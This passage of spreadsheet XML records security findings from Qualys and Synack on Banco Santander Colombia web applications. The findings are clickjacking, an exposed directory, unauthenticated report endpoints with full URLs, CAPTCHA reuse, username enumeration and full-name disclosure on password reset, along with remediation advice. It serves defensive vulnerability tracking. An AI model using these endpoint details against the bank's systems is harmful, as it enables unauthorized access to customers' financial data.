    <d v="2020-11-19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ALLOW-FROM incluyendo CHROMO y SAFARI._x000a_Para más información, véase https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para errores más comunes de implementación de X-FRAME-OPTION, por favor visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger_x000a__x000a_Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator"/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="125"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-d9b87928-ac46-4c02-9a41-fa00b9188bea"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-18T00:00:00"/>
    <n v="2043"/>
    <d v="2021-02-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-11-19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ALLOW-FROM incluyendo CHROMO y SAFARI._x000a_Para más información, véase https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para errores más comunes de implementación de X-FRAME-OPTION, por favor visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger_x000a__x000a_Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator"/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="126"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-bf154f49-1437-4d91-a7b9-a40ca9fe842d"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-18T00:00:00"/>
    <n v="2043"/>
    <d v="2021-02-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-11-19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ALLOW-FROM incluyendo CHROMO y SAFARI._x000a_Para más información, véase https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para errores más comunes de implementación de X-FRAME-OPTION, por favor visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger_x000a__x000a_Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator"/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="127"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-04b81260-93a5-46b5-a536-f9a51f2b23f0"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-18T00:00:00"/>
    <n v="2043"/>
    <d v="2021-02-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-11-19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ALLOW-FROM incluyendo CHROMO y SAFARI._x000a_Para más información, véase https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para errores más comunes de implementación de X-FRAME-OPTION, por favor visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger_x000a__x000a_Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator"/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="128"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-6ed27cf1-7f55-40a3-9bce-6dbb58f38467"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-18T00:00:00"/>
    <n v="2043"/>
    <d v="2021-02-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-11-19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ALLOW-FROM incluyendo CHROMO y SAFARI._x000a_Para más información, véase https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para errores más comunes de implementación de X-FRAME-OPTION, por favor visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger_x000a__x000a_Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator"/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="129"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-a0184b95-d471-4a40-a12e-d30c8f268991"/>
    <m/>
    <x v="56"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-12-30T00:00:00"/>
    <n v="2001"/>
    <d v="2021-03-30T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-02T00:00:00"/>
    <s v="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_x000a__x000a_Referencias:_x000a_Inyección maligna de CSS_x000a_Ataque de sobrescritura de la ruta relativa_x000a_Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobreescritura de ruta relativa."/>
    <s v="Se recomienda eliminar las URL relativas y utilizar las URL absolutas en las importaciones de CSS._x000a__x000a_Las siguientes alternativas pueden aplicarse para evitar las vulnerabilidades de PRSSI._x000a_- Establecer un DOCTYPE que no permita el modo Quirks como se explica en https://hsivonen.fi/doctype/_x000a_- Establecer el encabezado de respuesta X-Frame-Opciones: negar_x000a_- Ajustar el encabezado de respuesta X-Content-Type-Opciones: olfatear_x000a_- Definir una etiqueta base HTML para especificar la URL base para todas las URLs relativas de un documento."/>
    <m/>
    <d v="2021-03-12T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="130"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-24a43025-c35b-4b26-bb10-336d04f67950"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2020-12-30T00:00:00"/>
    <n v="2001"/>
    <d v="2021-04-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-09-20T00:00:00"/>
    <s v="Un archivo, directorio o listado de directorio potencialmente sensible fue descubierto en el servidor Web._x000a_https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fApp_Themes%2fadmin%2f"/>
    <s v="Verifique que el acceso a este archivo o directorio esté permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <d v="2021-08-19T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="131"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-b23d433c-5e0f-4f9a-bb7b-d653c02469cd"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15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PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="132"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-2fe5360d-b673-4bf6-98d9-a17c79915286"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15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PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="133"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-5a9e81a8-1747-4a91-9378-1ced8453b45f"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15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PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="134"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-2fb3f73a-bbe7-4a11-a057-ef8dd5c60d8b"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15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PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="135"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-39c03fee-9d6f-41db-8276-eaa5c2e1779d"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15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PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="136"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-b19c0202-d51a-4519-93ff-cf2f2283a5e1"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15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PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="137"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-0f055524-3301-4e06-8dc6-afffd618a419"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15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PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="138"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-5d0eeea6-1da0-4c38-bdd5-452c6e92fc19"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15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PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="139"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-c06625f0-5760-4273-9b0c-c5bb437a4ab2"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15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PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="140"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-7417a341-7b15-476a-9a75-519ca7441509"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-08T00:00:00"/>
    <n v="1992"/>
    <d v="2021-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15T00:00:00"/>
    <s v="El encabezado de X-Frame-Options no está configurado en la respuesta HTTP, lo que puede llevar a un posible enmarcado de la página._x000a_Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa encima de ella con botones de aspecto legítimo."/>
    <s v="La &quot;X-Frame-Opciones:&quot; permite tres opciones: DENY, SAMEORIGIN  y ALLOW-FROM. Se recomienda establecer las &quot;X-FRAME-OPTIONS&quot; en DENY, lo que no permitirá que ningún dominio enmarque el sitio, o SAMEORIGIN, que sólo permite enmarcar el mismo sitio. DENY y SAMEORGIN son soportados por todos los navegadores._x000a__x000a_Configurar &quot;X-FRAME-OPTIONS&quot; a ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan PERMITIR-ALTO incluyendo CHROME y SAFARI."/>
    <m/>
    <d v="2021-02-20T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="141"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="helicopterdetect10-3"/>
    <m/>
    <x v="66"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-14T00:00:00"/>
    <n v="1986"/>
    <d v="2021-02-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-08T00:00:00"/>
    <s v="El punto final, /reports/ReporteAmortizacion.seam, revela los informes internos de &quot;Amortizacion&quot;. La información revelada incluye:_x000a_- Totales de obligación (Totales)_x000a_- Identificación de la obligación (Id Obligaciones)_x000a_- Fechas de obligación_x000a__x000a_URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteAmortizacion.seam"/>
    <s v="Aplicar la validación de la autorización y el control de acceso para cada punto final, asegurando que sólo los usuarios con privilegios correctos tengan acceso."/>
    <s v="Un atacante podría revelar esta información interna."/>
    <d v="2021-03-12T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="142"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="helicopterdetect10-4"/>
    <m/>
    <x v="67"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-14T00:00:00"/>
    <n v="1986"/>
    <d v="2021-02-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-08T00:00:00"/>
    <s v="Estos puntos finales se utilizan para visualizar el interés del cliente por &quot;mora&quot; y &quot;corrientes&quot;. Este punto final revela:_x000a_- Los nombres de las empresas_x000a_- Identificación de la obligación_x000a_- Valores de intereses._x000a_URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteInteresesMora.seam_x000a_URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteInteresesCorrientes.seam"/>
    <s v="Aplicar la validación de la autorización y el control de acceso para cada punto final, asegurando que sólo los usuarios con privilegios correctos tengan acceso."/>
    <s v="Un atacante podría revelar esta información a terceros."/>
    <d v="2021-03-12T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="143"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="helicopterdetect10-1"/>
    <m/>
    <x v="68"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2021-01-14T00:00:00"/>
    <n v="1986"/>
    <d v="2021-04-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-08-11T00:00:00"/>
    <s v="La solicitud tiene el formulario de registro en línea para asegurarse de que sólo los usuarios legítimos lo soliciten. Hay una implementación de CAPTCHA en el formulario para asegurarse de que sólo los usuarios legítimos pidan esto._x000a__x000a_Sin embargo, no es validado en cada solicitud, y un atacante puede ser usado para automatizar la solicitud del formulario para realizar la inundación en la bandeja de entrada del usuario volviendo a emitir la solicitud con el antiguo CAPTCHA._x000a__x000a_URL: https://www.santander.com.co/Web/Pages/Requests/RequestServices_Step2.aspx"/>
    <s v="Asegúrate de que el CAPTCHA sea validado en cada solicitud._x000a__x000a_Ejemplo::_x000a_```_x000a_&lt;?xml version=&quot;1.0&quot;?&gt;_x000a_&lt;!--_x000a_ Para más información sobre cómo configurar su aplicación ASP.NET, por favor _x000a_  visite_x000a_  http://go.microsoft.com/fwlink/?LinkId=169433_x000a_  --&gt;_x000a_&lt;configuration&gt;_x000a_  &lt;configSections&gt;_x000a_    &lt;section name=&quot;botDetect&quot; requirePermission=&quot;false&quot; _x000a_    type=&quot;BotDetect.Configuration.BotDetectConfigurationSection, BotDetect&quot;/&gt;_x000a_  &lt;/configSections&gt;_x000a_  &lt;appSettings&gt;_x000a_    &lt;add key=&quot;aspnet:UseTaskFriendlySynchronizationContext&quot; value=&quot;true&quot;/&gt;_x000a_    &lt;add key=&quot;ValidationSettings:UnobtrusiveValidationMode&quot; value=&quot;None&quot;/&gt;_x000a_  &lt;/appSettings&gt;_x000a_  &lt;system.web&gt;_x000a_    &lt;httpHandlers&gt;_x000a_      &lt;!-- Register the HttpHandler used for BotDetect Captcha requests --&gt;_x000a_      &lt;add verb=&quot;GET&quot; path=&quot;BotDetectCaptcha.ashx&quot; _x000a_      type=&quot;BotDetect.Web.CaptchaHandler, BotDetect&quot;/&gt;_x000a_    &lt;/httpHandlers&gt;_x000a_    &lt;!-- Register a custom SessionIDManager for BotDetect Captcha requests --&gt;_x000a_    &lt;sessionState mode=&quot;InProc&quot; cookieless=&quot;AutoDetect&quot; timeout=&quot;20&quot; _x000a_    sessionIDManagerType=&quot;BotDetect.Web.CustomSessionIdManager, BotDetect&quot;/&gt;_x000a_    &lt;!-- Session state is required for BotDetect storage; you can also turn if off _x000a_    globally and only enable for BotDetect-protected pages if you prefer --&gt;_x000a_    &lt;pages controlRenderingCompatibilityVersion=&quot;4.5&quot; enableSessionState=&quot;true&quot;&gt;_x000a_      &lt;controls&gt;_x000a_      &lt;!-- Register the BotDetect tag prefix for easier use in all pages --&gt;_x000a_      &lt;add assembly=&quot;BotDetect&quot; namespace=&quot;BotDetect.Web.UI&quot; _x000a_      tagPrefix=&quot;BotDetect&quot;/&gt;_x000a_      &lt;/controls&gt;_x000a_    &lt;/pages&gt;_x000a_    &lt;compilation debug=&quot;false&quot; targetFramework=&quot;4.5&quot;/&gt;_x000a_    &lt;httpRuntime requestValidationMode=&quot;4.5&quot; targetFramework=&quot;4.5&quot; _x000a_    encoderType=&quot;System.Web.Security.AntiXss.AntiXssEncoder, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;/&gt;_x000a_    &lt;machineKey compatibilityMode=&quot;Framework45&quot;/&gt;_x000a_  &lt;/system.web&gt;_x000a_  &lt;system.webServer&gt;_x000a_    &lt;validation validateIntegratedModeConfiguration=&quot;false&quot;/&gt;_x000a_    &lt;handlers&gt;_x000a_      &lt;!-- Register the HttpHandler used for BotDetect Captcha requests (IIS 7.0+) _x000a_      --&gt;_x000a_      &lt;remove name=&quot;BotDetectCaptchaHandler&quot;/&gt;_x000a_      &lt;add name=&quot;BotDetectCaptchaHandler&quot; preCondition=&quot;integratedMode&quot; verb=&quot;GET&quot; _x000a_      path=&quot;BotDetectCaptcha.ashx&quot; type=&quot;BotDetect.Web.CaptchaHandler, BotDetect&quot;/&gt;_x000a_    &lt;/handlers&gt;_x000a_  &lt;/system.webServer&gt;_x000a_  &lt;botDetect helpLinkEnabled=&quot;true&quot; helpLinkMode=&quot;image&quot; /&gt;_x000a_&lt;/configuration&gt;_x000a_```_x000a__x000a_Reference:_x000a_https://captcha.com/doc/aspnet/samples/csharp/asp.net-basic-captcha-sample.html_x000a_https://www.c-sharpcorner.com/UploadFile/8a67c0/how-to-create-captcha-image-with-Asp-Net-application/_x000a_https://developers.google.com/recaptcha/intro"/>
    <s v="Un atacante puede automatizar la solicitud del formulario para realizar la inundación en la bandeja de entrada del usuario objetivo volviendo a emitir la solicitud con el antiguo CAPTCHA."/>
    <s v="1ª Fecha: 19/08/2021_x000a_2ª Fecha: 26/11/2021_x000a_3ª Fecha: 25/01/2021_x000a_4ª Fecha: 04/02/2022_x000a_5ª Fecha: 04/03/2022"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="144"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="helicopterdetect10-2"/>
    <m/>
    <x v="69"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-14T00:00:00"/>
    <n v="1986"/>
    <d v="2021-02-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-15T00:00:00"/>
    <s v="El backend de la aplicación está sobre Apache, JBoss y JSF (Facelets). Debido a un error en el manejo de los parámetros obtengo un error que revela la siguiente información:_x000a_- 107 usuarios (enumeración de cuentas)_x000a_- 336 puntos finales de la aplicación (pruebo muchos de estos puntos finales y son vulnerables a los problemas de control de acceso)_x000a_- 290 puntos finales de ayuda_x000a__x000a_Por ejemplo:_x000a_## Problema de control de acceso en el punto final /informes/ReporteProyecciónSaldo_x000a_Este punto final se utiliza para acceder al informe de proyección de balance (Proyección Saldo). Este punto final revela la compañía, el estado de vencimiento, el tipo de vencimiento, el valor y la fecha de pago._x000a__x000a_Los saldos de las empresas son $0 en la página, pero se muestra el valor del saldo._x000a__x000a_## Problema de control de acceso en el punto final ReporteDetalleDeudor_x000a_Este punto final revela los detalles de un deudor, como:_x000a_- tipo de producto_x000a_- Orden de Obligación_x000a_- Las cuotas hasta la fecha_x000a_- Nombre de Countrapart_x000a_- Fecha de vencimiento_x000a_- Estado_x000a_- El papel del cliente_x000a__x000a_URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteNovedadesObligacionPdf.seam_x000a_URL: https://confirming-factoring.santander.com.co/factoring/reportes/tareasPendientes.seam_x000a_URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteProyeccionSaldo.seam_x000a_URL: https://confirming-factoring.santander.com.co/factoring/reportes/ReporteDetalleDeudor.seam_x000a_URL: https://confirming-factoring.santander.com.co/factoring/reportes/*"/>
    <s v="Reconfigurar jboss para gestionar este tipo de errores y hacer cumplir la validación de la autorización y el control de acceso para cada punto final, asegurando que sólo los usuarios con privilegios correctos tengan acceso."/>
    <s v="Un atacante podría utilizar los puntos finales revelados para probar cuestiones de control de acceso, obteniendo información confidencial interna (esta información es clave porque la aplicación es vulnerable a estas cuestiones). Además, el uso de los nombres de usuario revelados podría forzar el inicio de sesión de la aplicación porque no tiene fuertes controles relacionados con la fuerza bruta."/>
    <d v="2021-03-12T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="145"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="helicopterdetect10-9"/>
    <m/>
    <x v="70"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-14T00:00:00"/>
    <n v="1986"/>
    <d v="2021-04-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-01-29T00:00:00"/>
    <s v="## Detalles_x000a_**Título**: La implementación de la contraseña de restablecimiento inadecuada revela el nombre completo de los propietarios de las cuentas en la página de restablecimiento de la contraseña_x000a_**Riesgo**: Medio_x000a_**Impacto**: Medio_x000a_**Explotabilidad**: Alto_x000a__x000a_## Introducción_x000a_Los datos sensibles son toda información que se pretende proteger del acceso no autorizado. Los datos sensibles pueden incluir cualquier cosa, desde información personal identificable (PII), como números de la Seguridad Social, hasta información bancaria o credenciales de acceso. Cuando un atacante accede a estos datos como resultado de una violación de datos, los usuarios corren el riesgo de que los datos sensibles queden expuestos. Las violaciones de datos que dan lugar a la exposición de credenciales sensibles pueden acarrear costos de millones de dólares, destruyendo con ello la reputación de una empresa. _x000a__x000a_## Sinopsis_x000a_**HELICOPTERDETECT10** permite a los usuarios restablecer sus contraseñas en el punto final de `/factoring/seguridad/preguntasSeguridadUsuario/generarCuestionarioNuevaContrasena.seam`._x000a__x000a_Desafortunadamente, la aplicación revela el nombre completo de los propietarios de la cuenta cuando el usuario solicita un restablecimiento de la contraseña para el nombre de usuario dado._x000a__x000a_Por ejemplo, cuando usamos &quot;funEH1&quot; como usuario para el restablecimiento de la contraseña, la aplicación revelará el nombre de los propietarios de la cuenta como:_x000a__x000a_&quot;Hacking Ético Funcional Uno_x000a__x000a_Mientras que la aplicación encripta el nombre de usuario en cada solicitud para evitar una posible fuerza bruta, la encriptación se realiza en el lado del cliente, lo que podría ser abusado para escribir guiones personalizados y enviar solicitudes sin pasar por la prevención._x000a__x000a_Revelar el nombre completo de los propietarios de las cuentas de esta manera traería casos potenciales de abuso como el phishing, así como la violación de la privacidad del usuario._x000a__x000a_Por ejemplo, los 